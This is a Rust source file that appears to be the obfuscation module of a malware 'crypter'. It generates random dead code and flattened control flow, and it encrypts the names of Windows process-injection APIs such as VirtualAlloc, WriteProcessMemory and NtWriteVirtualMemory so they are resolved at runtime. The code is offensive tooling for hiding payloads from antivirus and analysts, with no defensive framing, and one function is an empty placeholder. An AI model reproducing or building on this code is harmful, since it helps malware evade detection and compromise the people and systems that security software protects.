// Code Obfuscator
// Advanced code obfuscation techniques

use crate::crypter::mutator::{random_function_name, random_var_name};
use rand::prelude::SliceRandom;
use rand::Rng;

/// Generate dead code (unreachable functions and fake calculations)
pub fn generate_dead_code() -> String {
    let mut rng = rand::thread_rng();
    let dead_code_templates = vec![
        // Unreachable function
        format!(
            r#"#[allow(dead_code)]
fn {}() {{
    let mut {} = 0u32;
    for _ in 0..100 {{
        {} = {}.wrapping_add(1);
        {} = {}.wrapping_mul(2);
    }}
    let _ = std::hint::black_box({});
}}"#,
            random_function_name("dead"),
            random_var_name(),
            random_var_name(),
            random_var_name(),
            random_var_name(),
            random_var_name(),
            random_var_name(),
        ),
        // Fake API call
        format!(
            r#"#[allow(dead_code)]
unsafe fn {}() {{
    let {} = std::ptr::null_mut::<u8>();
    let {} = std::mem::size_of::<usize>();
    let _ = std::hint::black_box(({}, {}));
}}"#,
            random_function_name("fake_api"),
            random_var_name(),
            random_var_name(),
            random_var_name(),
            random_var_name(),
        ),
        // Dummy calculation
        format!(
            r#"#[allow(dead_code)]
fn {}() {{
    let mut {} = vec![0u8; 1024];
    for i in 0..{}.len() {{
        {}[i] = (i as u8).wrapping_add(0x42);
    }}
    let _ = std::hint::black_box({});
}}"#,
            random_function_name("dummy_calc"),
            random_var_name(),
            random_var_name(),
            random_var_name(),
            random_var_name(),
        ),
    ];

    let count = rng.gen_range(2..5); // 2-4 dead code blocks
    (0..count)
        .map(|_| dead_code_templates.choose(&mut rng).unwrap().clone())
        .collect::<Vec<_>>()
        .join("\n\n")
}

/// Generate control flow flattening (state machine)
/// Note: Infrastructure for Phase 8 - basic control flow obfuscation already implemented in stub_gen
#[allow(dead_code)]
pub fn generate_control_flow_flattening(blocks: Vec<(&str, String)>) -> String {
    let mut rng = rand::thread_rng();
    let state_var = random_var_name();
    let mut code = String::new();

    // Add dummy states
    let dummy_state_count = rng.gen_range(2..5);
    let total_states = blocks.len() + dummy_state_count;

    code.push_str(&format!(
        "    let mut {} = {};\n",
        state_var,
        rng.gen_range(0..total_states)
    ));
    code.push_str("    loop {\n");
    code.push_str(&format!("        match {} {{\n", state_var));

    let mut state_idx = 0;
    let mut block_indices: Vec<usize> = (0..blocks.len()).collect();
    block_indices.shuffle(&mut rng);

    // Insert dummy states randomly
    let mut dummy_inserted = 0;
    for i in 0..total_states {
        if dummy_inserted < dummy_state_count && rng.gen_bool(0.3) {
            // Dummy state
            code.push_str(&format!("            {} => {{\n", i));
            code.push_str(&format!(
                "                let _ = std::hint::black_box({});\n",
                rng.gen::<u32>()
            ));
            let next_state = if i == total_states - 1 {
                block_indices[0]
            } else {
                i + 1
            };
            code.push_str(&format!(
                "                {} = {};\n",
                state_var, next_state
            ));
            code.push_str("            }\n");
            dummy_inserted += 1;
        } else if state_idx < block_indices.len() {
            // Real block
            let block_idx = block_indices[state_idx];
            code.push_str(&format!("            {} => {{\n", i));
            code.push_str(&blocks[block_idx].1);

            // Determine next state
            let next_state = if state_idx == block_indices.len() - 1 {
                total_states // Break state
            } else {
                // Randomly choose next real state or dummy
                if rng.gen_bool(0.7) {
                    state_idx + 1
                } else {
                    rng.gen_range(0..total_states)
                }
            };

            if next_state >= total_states {
                code.push_str("                break;\n");
            } else {
                code.push_str(&format!(
                    "                {} = {};\n",
                    state_var, next_state
                ));
            }
            code.push_str("            }\n");
            state_idx += 1;
        }
    }

    code.push_str("            _ => break,\n");
    code.push_str("        }\n");
    code.push_str("    }\n");

    code
}

/// Generate instruction substitution patterns
/// Note: This is more relevant for assembly/compiled code, but we can apply
/// equivalent transformations in Rust source
/// Currently a placeholder - full implementation would require AST manipulation
#[allow(dead_code)]
pub fn substitute_instructions(code: &str) -> String {
    let result = code.to_string();

    // Pattern: x = 5 -> x = 2 + 3 (simple arithmetic substitution)
    // Pattern: x += 1 -> x = x.wrapping_add(1) (already using wrapping_add)
    // Pattern: x * 2 -> x << 1 (bit shift instead of multiply)

    // For Rust, we'll focus on arithmetic substitutions
    // More complex substitutions would require AST manipulation

    result
}

/// Obfuscate API names in code by replacing them with encrypted versions
/// Note: APIs are already resolved dynamically via api_resolver module
/// This function is kept for future enhancements
#[allow(dead_code)]
pub fn obfuscate_api_names_in_code(code: &str) -> String {
    use crate::crypter::string_obfuscator::{
        encrypt_api_name, generate_api_decrypt_code, generate_encrypted_string_code,
    };

    let api_names = vec![
        "VirtualAlloc",
        "VirtualProtect",
        "CreateProcessA",
        "WriteProcessMemory",
        "ReadProcessMemory",
        "GetProcAddress",
        "LoadLibraryA",
        "GetModuleHandleA",
        "NtAllocateVirtualMemory",
        "NtProtectVirtualMemory",
        "NtWriteVirtualMemory",
    ];

    let mut result = code.to_string();
    let mut api_constants = String::new();
    let mut api_decryptors = String::new();

    for api_name in &api_names {
        if result.contains(api_name) {
            let (encrypted, key) = encrypt_api_name(api_name);
            let var_name = format!("API_{}", api_name.to_uppercase().replace("A", "_A"));
            let (enc_const, key_const) =
                generate_encrypted_string_code(&var_name, &encrypted, &key);

            api_constants.push_str(&enc_const);
            api_constants.push_str(&key_const);
            api_constants.push_str("\n");

            let dec_var = format!("{}_DEC", var_name);
            let decrypt_code = generate_api_decrypt_code(
                &format!("{}_ENC", var_name),
                &format!("{}_KEY", var_name),
                &dec_var,
            );

            api_decryptors.push_str(&format!("    let {} = {};\n", dec_var, decrypt_code));

            // Replace API name with decrypted variable
            // Note: This is simplified - full implementation would need proper parsing
            result = result.replace(api_name, &format!("resolve_api_by_name(&{})", dec_var));
        }
    }

    if !api_constants.is_empty() {
        result = format!("{}\n\n{}", api_constants, result);
    }

    if !api_decryptors.is_empty() {
        // Insert decryptors at the start of functions that use them
        // Simplified: just prepend
        result = format!("{}\n{}", api_decryptors, result);
    }

    result
}
